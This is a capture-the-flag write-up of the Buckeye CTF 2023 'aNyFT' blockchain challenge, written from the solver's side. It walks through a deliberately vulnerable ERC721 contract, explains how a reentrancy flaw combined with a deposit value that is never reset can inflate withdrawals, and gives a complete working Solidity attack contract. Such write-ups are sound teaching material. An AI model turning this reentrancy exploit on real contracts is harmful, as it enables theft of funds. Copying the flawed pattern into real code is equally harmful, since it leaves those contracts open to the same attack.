---
title: "Buckeye CTF 2023 (feat. CygnusX)"
layout: post
date: 2023-10-2 22:50
tag:
- CTF
- b01lers
star: false
category: blog
author: B01lers Team
description: Writeup from buckeye CTF 2023 featuring CygnusX!!
---
# Buckeye CTF 2023 Writeup Feature 
Here we are showcasing a writeup created by a member of the b01lers CTF team, CygnusX. Enjoy!

# Blockchain - aNyFT
7 solves - 477 points - First Blood!

## Challenge Description
`NFTs made accessible for everyone, even those who shouldn't have access.`

In this file, we are given a netcat port which sends us the address a contract is deployed at, our token to submit to verify we have solved the challenge and a solidity file with the following contents:
```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {IERC165, ERC165} from "@openzeppelin/contracts/utils/introspection/ERC165.sol";

interface IERC721Errors {
    error ERC721InvalidOwner(address owner);
    error ERC721NonexistentToken(uint256 tokenId);
    error ERC721IncorrectOwner(address sender, uint256 tokenId, address owner);
    error ERC721InvalidSender(address sender);
    error ERC721InvalidReceiver(address receiver);
    error ERC721InsufficientApproval(address operator, uint256 tokenId);
    error ERC721InvalidApprover(address approver);
    error ERC721InvalidOperator(address operator);
    error ETHInvalidReceiver(address operator);
}

contract aNyFT is ERC165, IERC721, IERC721Metadata, IERC721Errors {
    address creator;
    
    string private _name;
    string private _symbol;

    mapping(uint256 tokenId => address) private _owners;
    mapping(address owner => uint256) private _balances;

    mapping(uint256 tokenId => address) private _tokenApprovals;
    mapping(address owner => mapping(address operator => bool)) private _operatorApprovals;

    mapping(uint256 tokenID => string) private _nftData;
    uint private currentToken;

    mapping(address owner => bool) private createdNFT;
    mapping(address owner => uint deposit) private deposits;
    mapping(address owner => uint withdrawn_amt) private _withdrawn; 

    event GetFlag(bytes16 flag);

    constructor(string memory tokenName, string memory tokenSymbol) {
        _name = tokenName;
        _symbol = tokenSymbol;
        currentToken = 0;
        creator = msg.sender;
    }

    function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
        return
            interfaceId == type(IERC721).interfaceId ||
            interfaceId == type(IERC721Metadata).interfaceId ||
            super.supportsInterface(interfaceId);
    }

    function balanceOf(address owner) public view virtual returns (uint256) {
        if (owner == address(0)) {
            revert ERC721InvalidOwner(address(0));
        }
        return _balances[owner];
    }

    function ownerOf(uint256 tokenId) public view virtual returns (address) {
        address owner = _ownerOf(tokenId);
        if (owner == address(0)) {
            revert ERC721NonexistentToken(tokenId);
        }
        return owner;
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function tokenURI(uint256 tokenId) public view virtual returns (string memory) {
        return tokenData(tokenId);
    }

    function tokenData(uint256 tokenId) public view virtual returns (string memory) {
        _requireMinted(tokenId);
        return _nftData[tokenId];
    }

    function _baseURI() internal view virtual returns (string memory) {
        return "";
    }

    function approve(address to, uint256 tokenId) public virtual {
        _approve(to, tokenId, msg.sender);
    }

    function getApproved(uint256 tokenId) public view virtual returns (address) {
        _requireMinted(tokenId);

        return _getApproved(tokenId);
    }

    function setApprovalForAll(address operator, bool approved) public virtual {
        _setApprovalForAll(msg.sender, operator, approved);
    }

    function isApprovedForAll(address owner, address operator) public view virtual returns (bool) {
        return _operatorApprovals[owner][operator];
    }

    function transferFrom(address from, address to, uint256 tokenId) public virtual {
        if (to == address(0)) {
            revert ERC721InvalidReceiver(address(0));
        }
       

        address previousOwner = _update(to, tokenId, msg.sender);
        if (previousOwner != from) {
            revert ERC721IncorrectOwner(from, tokenId, previousOwner);
        }
    }

    function safeTransferFrom(address from, address to, uint256 tokenId) public {
        safeTransferFrom(from, to, tokenId, "");
    }

    function safeTransferFrom(address from, address to, uint256 tokenId, bytes memory data) public virtual {
        transferFrom(from, to, tokenId);
        _checkOnERC721Received(from, to, tokenId, data);
    }

    function _ownerOf(uint256 tokenId) internal view virtual returns (address) {
        return _owners[tokenId];
    }

    function _getApproved(uint256 tokenId) internal view virtual returns (address) {
        return _tokenApprovals[tokenId];
    }

    function _isAuthorized(address owner, address spender, uint256 tokenId) internal view virtual returns (bool) {
        return
            spender != address(0) &&
            (owner == spender || isApprovedForAll(owner, spender) || _getApproved(tokenId) == spender);
    }

    function _checkAuthorized(address owner, address spender, uint256 tokenId) internal view virtual {
        if (!_isAuthorized(owner, spender, tokenId)) {
            if (owner == address(0)) {
                revert ERC721NonexistentToken(tokenId);
            } else {
                revert ERC721InsufficientApproval(spender, tokenId);
            }
        }
    }

    function _update(address to, uint256 tokenId, address auth) internal virtual returns (address) {
        address from = _ownerOf(tokenId);

        if (auth != address(0)) {
            _checkAuthorized(from, auth, tokenId);
        }

        if (from != address(0)) {
            _approve(address(0), tokenId, address(0), false);

            unchecked {
                _balances[from] -= 1;
            }
        }

        if (to != address(0)) {
            unchecked {
                _balances[to] += 1;
            }
        }

        _owners[tokenId] = to;
        emit Transfer(from, to, tokenId);

        return from;
    }

    function _mint(address to, uint256 tokenId) internal {
        if (to == address(0)) {
            revert ERC721InvalidReceiver(address(0));
        }
        address previousOwner = _update(to, tokenId, address(0));
        if (previousOwner != address(0)) {
            revert ERC721InvalidSender(address(0));
        }
    }

    function _safeMint(address to, uint256 tokenId) internal {
        _safeMint(to, tokenId, "");
    }

    function _safeMint(address to, uint256 tokenId, bytes memory data) internal virtual {
        _mint(to, tokenId);
        deposits[to] = msg.value;
        _checkOnERC721Received(address(0), to, tokenId, data);
    }

    function _burn(uint256 tokenId) internal {
        address previousOwner = _update(address(0), tokenId, address(0));
        if (previousOwner == address(0)) {
            revert ERC721NonexistentToken(tokenId);
        }

        _withdrawn[previousOwner] += deposits[previousOwner];
    }

    function burn(uint256 tokenId) public {
        require(_isAuthorized(msg.sender, msg.sender, tokenId));
        _burn(tokenId);
    }

    function burn(address owner, uint256 tokenId) public {
        require(_isAuthorized(owner, msg.sender, tokenId));
        _burn(tokenId);
    }

    function mint(string memory data) public payable returns (uint) {
        require(createdNFT[msg.sender] == false, "Address already has created NFT");
        require(msg.value >= 5e15, "Insufficient deposit to create NFT");
        require(msg.value <= 500e15, "Deposit is too large");

        uint _currentToken = currentToken;
        currentToken += 1;

        _nftData[_currentToken] = data;
        _safeMint(msg.sender, _currentToken);
        createdNFT[msg.sender] = true;

        return _currentToken;
    }

    function mint(string memory data, address to) public payable returns (uint) {
        require(createdNFT[msg.sender] == false, "Address already has created NFT");
        require(msg.value >= 5e15, "Insufficient deposit to create NFT");
        require(msg.value <= 500e15, "Deposit is too large");

        uint _currentToken = currentToken;
        currentToken += 1;

        _nftData[_currentToken] = data;
        _safeMint(to, _currentToken);
        createdNFT[msg.sender] = true;

        return _currentToken;
    }

    function getFlag(bytes16 token) public returns (bool) {
        require(_withdrawn[msg.sender] >= 11 ether || msg.sender == creator);

        emit GetFlag(token);

        return true;
    }

    function _transfer(address from, address to, uint256 tokenId) internal {
        if (to == address(0)) {
            revert ERC721InvalidReceiver(address(0));
        }
        address previousOwner = _update(to, tokenId, address(0));
        if (previousOwner == address(0)) {
            revert ERC721NonexistentToken(tokenId);
        } else if (previousOwner != from) {
            revert ERC721IncorrectOwner(from, tokenId, previousOwner);
        }
    }

    function _safeTransfer(address from, address to, uint256 tokenId) internal {
        _safeTransfer(from, to, tokenId, "");
    }

    function _safeTransfer(address from, address to, uint256 tokenId, bytes memory data) internal virtual {
        _transfer(from, to, tokenId);
        _checkOnERC721Received(from, to, tokenId, data);
    }

    function _approve(address to, uint256 tokenId, address auth) internal {
        _approve(to, tokenId, auth, true);
    }

    function _approve(address to, uint256 tokenId, address auth, bool emitEvent) internal virtual {
        if (emitEvent || auth != address(0)) {
            address owner = ownerOf(tokenId);

            if (auth != address(0) && owner != auth && !isApprovedForAll(owner, auth)) {
                revert ERC721InvalidApprover(auth);
            }

            if (emitEvent) {
                emit Approval(owner, to, tokenId);
            }
        }

        _tokenApprovals[tokenId] = to;
    }

    function _setApprovalForAll(address owner, address operator, bool approved) internal virtual {
        if (operator == address(0)) {
            revert ERC721InvalidOperator(operator);
        }
        _operatorApprovals[owner][operator] = approved;
        emit ApprovalForAll(owner, operator, approved);
    }

    function _requireMinted(uint256 tokenId) internal view virtual {
        if (_ownerOf(tokenId) == address(0)) {
            revert ERC721NonexistentToken(tokenId);
        }
    }

    function _checkOnERC721Received(address from, address to, uint256 tokenId, bytes memory data) private {
        if (to.code.length > 0) {
            try IERC721Receiver(to).onERC721Received(msg.sender, from, tokenId, data) returns (bytes4 retval) {
                if (retval != IERC721Receiver.onERC721Received.selector) {
                    revert ERC721InvalidReceiver(to);
                }
            } catch (bytes memory reason) {
                if (reason.length == 0) {
                    revert ERC721InvalidReceiver(to);
                } else {
                    /// @solidity memory-safe-assembly
                    assembly {
                        revert(add(32, reason), mload(reason))
                    }
                }
            }
        }
    }

    function withdrawn(address owner) public view returns (uint) {
        return _withdrawn[owner];
    }

    function destroy() public {
        require(msg.sender == creator);

        selfdestruct(payable(creator));
    }
}
```

This code may look like a lot, but it seems to follow the template for an ERC721 token given in `https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/IERC721.sol` with just a few minor changes to a couple functions.

```js
function getFlag(bytes16 token) public returns (bool) {
        require(_withdrawn[msg.sender] >= 11 ether || msg.sender == creator);

        emit GetFlag(token);

        return true;
    }
```

The getFlag function requires us to have 11 ether stored in the _withdrawn array at our address or to be the creator of the contract. It doesn't seem like there is any way to forge ourself as the creator so we need to find some way to have `_withdrawn[msg.sender] >= 11 ether`.


```js
function _burn(uint256 tokenId) internal {
        address previousOwner = _update(address(0), tokenId, address(0));
        if (previousOwner == address(0)) {
            revert ERC721NonexistentToken(tokenId);
        }

        _withdrawn[previousOwner] += deposits[previousOwner];
    }
```

This _burn function appears to be the only way to update the _withdrawn array. Interestingly, it adds the value of a deposits arrray at a previousOwner address (this is the previous owner of the token we are trying to burn) to the _withdrawn array, but does not subtract the value from the deposits array. 

```js
function mint(string memory data) public payable returns (uint) {
        require(createdNFT[msg.sender] == false, "Address already has created NFT");
        require(msg.value >= 5e15, "Insufficient deposit to create NFT");
        require(msg.value <= 500e15, "Deposit is too large");

        uint _currentToken = currentToken;
        currentToken += 1;

        _nftData[_currentToken] = data;
        _safeMint(msg.sender, _currentToken);
        createdNFT[msg.sender] = true;

        return _currentToken;
    }
```

When we mint a new token, the function calls _safeMint, but our message.value must be between 5e15 and 500e15 or 5 finney and 500 finney. This means that we cannot mint a token with a value of 11 ether.

```js
function _safeMint(address to, uint256 tokenId, bytes memory data) internal virtual {
        _mint(to, tokenId);
        deposits[to] = msg.value;
        _checkOnERC721Received(address(0), to, tokenId, data);
    }
```

The _safeMint function is called whenever we mint a new aNyTF token. This seems to be the only way to update the deposits value. However, it only is able to set our deposits value to the amount of ether we specify when minting a new token. This means that we need to find some way to mint a token with a value of 11 ether. 

Interestingly, there is a known reentrancy exploit in ERC721 tokens that can allow us to mint as many tokens as we want. 

```js
function _checkOnERC721Received(address from, address to, uint256 tokenId, bytes memory data) private {
        if (to.code.length > 0) {
            try IERC721Receiver(to).onERC721Received(msg.sender, from, tokenId, data) returns (bytes4 retval) {
                if (retval != IERC721Receiver.onERC721Received.selector) {
                    revert ERC721InvalidReceiver(to);
                }
            } catch (bytes memory reason) {
                if (reason.length == 0) {
                    revert ERC721InvalidReceiver(to);
                } else {
                    /// @solidity memory-safe-assembly
                    assembly {
                        revert(add(32, reason), mload(reason))
                    }
                }
            }
        }
    }
```

In this function, which is called in the _safeMint function, we can see that the `onERC721Received` function is called on the to address. This means that we can create a contract that implements the `onERC721Received` function and then call the _safeMint function with the address of our contract as the to address. This will call the `onERC721Received` function in our contract and allow us to recall the mint function before `createdNFT[msg.sender] = true;` is updated.

```ts
contract Attack is IERC721Receiver{
    aNyFT public  anyFT;
    bytes4 private constant _ERC721_RECEIVED = IERC721Receiver.onERC721Received.selector;
    uint256[] public tokenIds;

    constructor (address _addr) {
        anyFT = aNyFT(_addr);
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        anyFT.mint("bruh");
        emit ERC721Received(operator, from, tokenId, data);
        return _ERC721_RECEIVED;
    }
}
```

So far with what we know this is what our attacking contract looks like. Our attacking contract is an `IERC721Receiver` and implements the `onERC721Received` function which will recall `anyFT.mint`. All of this code gets run before `createdNFT[msg.sender] = true;` is updated.

Now we have a separate problem. The above code will allow us to mint as many tokens as we want, but we would need to provide at least 0.005 ether per token, and we need to get our deposit value to 11 ether. We would still be spending 11 ether which is way too much.

```js
function _burn(uint256 tokenId) internal {
        address previousOwner = _update(address(0), tokenId, address(0));
        if (previousOwner == address(0)) {
            revert ERC721NonexistentToken(tokenId);
        }

        _withdrawn[previousOwner] += deposits[previousOwner];
    }
```

One thing to remember in the _burn function, is that our deposits amount never gets reset. It only resets to the value we specify when creating a new token. So why dont we create a bunch of 0.005 ether tokens, and have our last token contain 0.5 ether. This will cause our deposits value to incrememnt at 0.5 ether per token instead of the token's real value. This means that we only need to mint 22 tokens to get our deposits value to 11 ether. This would cost `0.005*21+0.5 = 0.605 ether` which is much more reasonable.

# Attacking Contract

```ts
contract Attack is IERC721Receiver{
    aNyFT public  anyFT;
    bytes4 private constant _ERC721_RECEIVED = IERC721Receiver.onERC721Received.selector;
    uint256 public count = 0;
    uint256[] public tokenIds;

    constructor (address _addr) {
        anyFT = aNyFT(_addr);
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        count += 1;
        addTokenId(tokenId);
        if (count < 22) {
            anyFT.mint{value: 0.005 ether}("bruh");
        }
        else if (count == 22) {
            anyFT.mint{value: 0.5 ether}("bruh");
        }
        emit ERC721Received(operator, from, tokenId, data);
        return _ERC721_RECEIVED;
    }

    function mint() public payable {
        anyFT.mint{value: 0.005 ether}("hi");
    }

    function sendToMe() public {
        for (uint256 i = 0; i < tokenIds.length; i++) {
            anyFT.burn(tokenIds[i]);
        }
    }

    function addTokenId(uint256 tokenId) internal {
        tokenIds.push(tokenId);
    }

    function getFlag(bytes16 token) public {
        anyFT.getFlag(token);
    }

    event ERC721Received(
        address indexed operator,
        address indexed from,
        uint256 indexed tokenId,
        bytes data
    );

    receive() external payable {

    }

}
```

We first call the mint function, which starts the reentrancy. Once we have called the aNyFT contract's mint function enough times, we call the sendToMe function which burns all the tokens we created. This will cause the deposits value to increase by 0.5 ether per token. Once we have 11 ether in our deposits value, we can call the getFlag function with our user token provided from the netcat port to get the flag.

Connecting to the Sepolia Test Net and aNyFT at the specified address, deploying our contract and calling the getFlag function we get `bctf{nft5_r_4_3v3r3y0n3}` using only `0.605 ether`!
